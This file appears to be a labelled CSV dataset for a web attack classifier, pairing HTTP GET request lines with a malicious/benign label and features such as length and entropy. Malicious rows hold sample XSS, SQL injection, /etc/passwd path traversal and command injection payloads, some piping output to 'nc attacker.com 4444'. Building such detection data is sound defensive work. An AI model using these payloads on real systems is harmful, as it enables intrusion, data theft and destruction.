payload,label,length,special_ratio,entropy
GET /comment?q=<video><source onerror='alert(1)'> HTTP/1.1,1,58.0,0.13793103448275862,4.701195065303421
GET /profile?user='; DROP TABLE users-- HTTP/1.1,1,48.0,0.041666666666666664,4.629247855285172
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /about.html?filter=active&category=electronics HTTP/1.1,0,59.0,0.01694915254237288,4.634359312213626
GET /document?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.348822160974294
GET /search?page=1&limit=10&filter=active HTTP/1.1,0,50.0,0.04,4.543465189601648
GET /register?category=electronics&sort=name&size=medium HTTP/1.1,0,65.0,0.03076923076923077,4.52415122863993
GET /file?file=../../../etc/passwd HTTP/1.1,1,43.0,0.0,4.108333720677514
GET /docs?price=100&q=search+term HTTP/1.1,0,42.0,0.023809523809523808,4.588164148711681
GET /contact.html?color=blue HTTP/1.1,0,37.0,0.0,4.350684784255508
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /index.html?sort=name&color=blue&id=123 HTTP/1.1,0,52.0,0.038461538461538464,4.767183467891462
GET /exec?cmd=hostname$(whoami) HTTP/1.1,1,40.0,0.075,4.615311532225102
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /login?user=1' ORDER BY 10-- HTTP/1.1,1,41.0,0.024390243902439025,4.5681732734814915
GET /login?sort=name&limit=10&category=electronics HTTP/1.1,0,59.0,0.03389830508474576,4.53884283724075
GET /download?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.170044500340504
GET /run?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,52.0,0.019230769230769232,4.481515141501589
GET /dashboard?filter=active&q=search+term HTTP/1.1,0,51.0,0.0196078431372549,4.66242975365136
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /search?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,49.0,0.0,4.297784843850294
GET /search?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,60.0,0.06666666666666667,4.604574504151557
GET /profile?user=' OR 'a'='a HTTP/1.1,1,38.0,0.10526315789473684,4.385956789702441
GET /run?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,52.0,0.019230769230769232,4.635361295347742
GET /search?limit=10 HTTP/1.1,0,29.0,0.0,4.32316116739216
GET /login?size=medium HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /comment?q=<script>alert(document.cookie)</script> HTTP/1.1,1,63.0,0.09523809523809523,4.723411376520694
"GET /api/user?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,70.0,0.07142857142857142,4.9628724384914715
GET /image?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,52.0,0.0,4.4473385747039735
GET /search?filter=active&limit=10 HTTP/1.1,0,43.0,0.023255813953488372,4.47232173124503
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,55.0,0.10909090909090909,4.803642667873433
GET /dashboard?sort=name&size=medium&id=123 HTTP/1.1,0,52.0,0.038461538461538464,4.622764717808251
GET /products.html?q=search+term HTTP/1.1,0,41.0,0.0,4.570609016654903
GET /search?user='; DROP TABLE users-- HTTP/1.1,1,47.0,0.0425531914893617,4.509494905320962
GET /contact.html?id=123&color=blue HTTP/1.1,0,44.0,0.022727272727272728,4.629219686524096
GET /login?sort=name&price=100 HTTP/1.1,0,39.0,0.02564102564102564,4.580023372597455
GET /contact.html?color=blue&limit=10 HTTP/1.1,0,46.0,0.021739130434782608,4.501397825434101
GET /image?file=../../../etc/passwd HTTP/1.1,1,44.0,0.0,4.216908108113273
GET /profile?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,61.0,0.06557377049180328,4.774518894727133
GET /exec?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,53.0,0.018867924528301886,4.44039534215702
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /search?page=1 HTTP/1.1,0,27.0,0.0,4.106377316818028
GET /docs?price=100&page=1 HTTP/1.1,0,35.0,0.02857142857142857,4.364857659740294
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /docs?limit=10&filter=active HTTP/1.1,0,41.0,0.024390243902439025,4.521828528850024
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /login?user=' UNION SELECT * FROM users-- HTTP/1.1,1,54.0,0.018518518518518517,4.770419734409208
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
